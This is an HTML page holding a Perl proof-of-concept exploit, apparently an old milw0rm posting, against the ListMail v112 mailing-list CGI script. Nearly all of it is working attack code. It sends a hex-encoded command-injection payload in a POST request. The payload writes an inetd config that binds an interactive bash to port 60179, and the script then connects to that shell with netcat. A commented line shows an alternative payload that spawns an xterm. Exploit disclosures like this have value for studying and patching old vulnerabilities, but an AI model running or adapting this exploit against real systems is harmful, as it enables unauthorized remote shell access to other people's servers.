<html><head><title>ListMail v112 - Command Execution</title></head><pre>#!/usr/bin/perl -w

## Listmail v112 by P.M.Systems / PoC Exploit
##
## Listmail is a powerful, hands-free mailing
## list manager which is exploitable due to an
## insecure open call. This exploit will attempt
## to bind a shell at port 60179/fido by using
## inetd. Code to spawn an xterm is as always 
## included.
##
## http://teleh0r.cjb.net/ || teleh0r@doglover.com

use strict; use Socket;

if (@ARGV &lt; 1) {
    print(&quot;Usage: $0 &lt;target&gt;\n&quot;);
    exit(1);
}

my($target,$length,$cgicode,$agent,$sploit, 
   $iaddr,$paddr,$proto);

$target = $ARGV[0];

print(&quot;\nRemote host: $target\n&quot;);
print(&quot;CGI-script: /cgi-bin/lmail.pl\n&quot;);

$agent = &quot;Mozilla/4.0 (compatible; MSIE 5.01; Windows 95)&quot;;

# echo 'fido stream tcp nowait nobody /bin/bash bash -i' &gt; /tmp/.hass;
# /usr/sbin/inetd /tmp/.hass

$cgicode =

&quot;\x63\x66\x67\x3d\x7c\x65\x63\x68\x6f\x2b\x27\x66\x69&quot;.
&quot;\x64\x6f\x2b\x73\x74\x72\x65\x61\x6d\x2b\x74\x63\x70&quot;.
&quot;\x2b\x6e\x6f\x77\x61\x69\x74\x2b\x6e\x6f\x62\x6f\x64&quot;.
&quot;\x79\x2b\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x2b\x62&quot;.
&quot;\x61\x73\x68\x2b\x2d\x69\x27\x2b\x3e\x2b\x2f\x74\x6d&quot;.
&quot;\x70\x2f\x2e\x68\x61\x73\x73\x3b\x2f\x75\x73\x72\x2f&quot;.
&quot;\x73\x62\x69\x6e\x2f\x69\x6e\x65\x74\x64\x2b\x2f\x74&quot;.
&quot;\x6d\x70\x2f\x2e\x68\x61\x73\x73\x7c&quot;;

# Code to spawn an xterm - exploit would have to be modfied.
# cfg=%7Cxterm+-ut+-display+localhost%3A0%7C

$sploit =
&quot;POST /cgi-bin/lmail.pl HTTP/1.0
Connection: close
User-Agent: $agent
Host: $target
Content-type: application/x-www-form-urlencoded
Content-length: 130

$cgicode&quot;;

$iaddr = inet_aton($target)                     || die(&quot;Error: $!\n&quot;);
$paddr = sockaddr_in(80, $iaddr)                || die(&quot;Error: $!\n&quot;);
$proto = getprotobyname('tcp')                  || die(&quot;Error: $!\n&quot;);

socket(SOCKET, PF_INET, SOCK_STREAM, $proto)    || die(&quot;Error: $!\n&quot;);
connect(SOCKET, $paddr)                         || die(&quot;Error: $!\n&quot;);
send(SOCKET,&quot;$sploit\015\012&quot;, 0)               || die(&quot;Error: $!\n&quot;);
close(SOCKET);

print(&quot;\nSleeping 5 seconds - waiting for the shell ...\n\n&quot;);
sleep(5); system(&quot;nc -w 10 $target 60179&quot;); exit(0);


# milw0rm.com [2000-11-17]</pre></html>